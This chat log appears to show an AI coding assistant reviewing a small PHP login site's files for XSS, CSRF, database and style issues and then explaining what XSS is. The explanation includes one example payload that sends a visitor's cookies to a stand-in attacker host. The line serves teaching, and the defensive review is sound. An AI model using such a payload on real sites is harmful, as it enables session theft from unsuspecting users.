User: review all php files in /inc and /www, suggest improvements

Here's a structured review grouped by priority:

## 🔴 Security

### 1. XSS in menu rendering — html-prolog.php

`$href` and `$item[0]` are interpolated directly into HTML without escaping:

```php
// ❌ now
"<a href='$href'" . ($item[1] ? " class='active'" : "") . ">$item[0]</a>"

// ✅ fix
$h = htmlspecialchars($href, ENT_QUOTES);
$l = htmlspecialchars($item[0], ENT_QUOTES);
"<a href='$h'" . ($item[1] ? " class='active'" : "") . ">$l</a>"
```

### 2. XSS in login error message — login.php

`$msg` from `dbLogin()` is echoed raw:

```php
// ❌ now
<?= $msg ?: '&nbsp;' ?>

// ✅ fix
<?= $msg ? htmlspecialchars($msg, ENT_QUOTES) : '&nbsp;' ?>
```

### 3. No CSRF protection — login.php, logout.php

Logout via a plain GET link means any external page can log out your user. Login form has no token. Both should use a CSRF token or at minimum verify `$_SERVER['REQUEST_METHOD'] === 'POST'` on logout.

---

## 🟠 Correctness / Bugs

### 4. `fetchAll` when only one row is needed — db.php

Fetches all matching rows into memory, then uses only `$res[0]`:

```php
// ❌ now
$res = $sql->fetchAll(PDO::FETCH_NUM);
[$id, $name] = $res[0] ?? [null, null];

// ✅ fix
[$id, $name] = $sql->fetch(PDO::FETCH_NUM) ?: [null, null];
```

### 5. `$sql` reused for two different types — db.php

`$sql` is first a `string`, then reassigned to a `PDOStatement`. Use distinct names (`$query`, `$stmt`).

### 6. `sesSet` trims the user ID — start.php

`trim()` is called on an `int` (`$id`), which coerces it to string. Works by accident because `usrId()` casts back, but it's misleading. Consider a typed `sesSetInt()` or skip `trim` for non-string values.

---

## 🟡 Architecture

### 7. No `<head>` injection point

Pages put `<style>` and `<script>` tags **inside `<body>`** (after html-prolog.php has already closed `</head>`). A clean fix is to have pages define `$headExtra` before including the prolog:

```php
// in home.php
$headExtra = '<style>main { align-items: center; }</style>';
require INC . 'html-prolog.php';

// in html-prolog.php <head>:
<?= $headExtra ?? '' ?>
</head>
```

### 8. Hardcoded DB credentials — db.php

Use environment variables instead:

```php
$host = getenv('DB_HOST') ?: 'postgres';
$db   = getenv('DB_NAME') ?: 'pri';
$user = getenv('DB_USER') ?: 'pri';
$pass = getenv('DB_PASS') ?: '';
```

These can be set in docker-compose.yml under `environment:`.

### 9. New DB connection on every login attempt — db.php

For now `dbLogin` is the only DB call so it's fine, but as the app grows a shared PDO instance (e.g. created once in start.php) will be needed.

---

## 🔵 Style / Minor

### 10. Short open tag `<?` everywhere

`<?php` is the safe, universally supported form. `<?=` (for echo) is always fine since PHP 5.4, but bare `<?` requires `short_open_tag=On`.

### 11. Inline styles in HTML templates — html-prolog.php

```html
<!-- ❌ -->
<img style="height: 100%;" ... />
<span style="flex:1"></span>
```

These belong in `layout.css` / `elems.css`.

### 12. `required_from()` depth assumption — menu.php

`$trace[1]` assumes a call depth of exactly 1. If menu.php is ever included via another helper, this breaks silently. Could be made more robust by searching the trace for the first non-menu.php frame.

---

**Summary table:**

| #   | File            | Issue                   | Severity |
| --- | --------------- | ----------------------- | -------- |
| 1   | html-prolog.php | XSS in menu             | 🔴       |
| 2   | login.php       | XSS in error msg        | 🔴       |
| 3   | login/logout    | No CSRF                 | 🔴       |
| 4   | db.php          | `fetchAll` → `fetch`    | 🟠       |
| 5   | db.php          | `$sql` type collision   | 🟠       |
| 6   | start.php       | `trim()` on int         | 🟠       |
| 7   | all pages       | No `<head>` injection   | 🟡       |
| 8   | db.php          | Hardcoded credentials   | 🟡       |
| 9   | db.php          | Per-call DB connection  | 🟡       |
| 10  | all files       | Short open tags         | 🔵       |
| 11  | html-prolog.php | Inline styles           | 🔵       |
| 12  | menu.php        | Fragile backtrace depth | 🔵       |

Want me to apply any of these fixes?

User: what is XSS

GitHub Copilot: **XSS (Cross-Site Scripting)** is an attack where malicious JavaScript is injected into a page and executed in another user's browser.

### How it happens

If your app outputs user-controlled data raw into HTML:

```php
echo "Error: " . $msg;  // $msg came from user input or DB
```

An attacker crafts input like:

```
<script>fetch('https://evil.com?c='+document.cookie)</script>
```

That script then runs in **every visitor's browser** — stealing sessions, redirecting users, defacing the page, etc.

### The fix — always escape output

```php
echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');
```

This turns `<script>` into `&lt;script&gt;` — displayed as text, never executed.

### In your project specifically

In html-prolog.php the menu renders `$href` and `$item[0]` raw. Those values come from menu.php which is hardcoded — so **currently safe**. But if menu items ever come from a database or user input, it becomes an XSS hole. Same with `$msg` in login.php — `dbLogin()` returns `'Invalid login'` which is also hardcoded now, but could change.

The habit of **always escaping** protects against future changes breaking security accidentally.
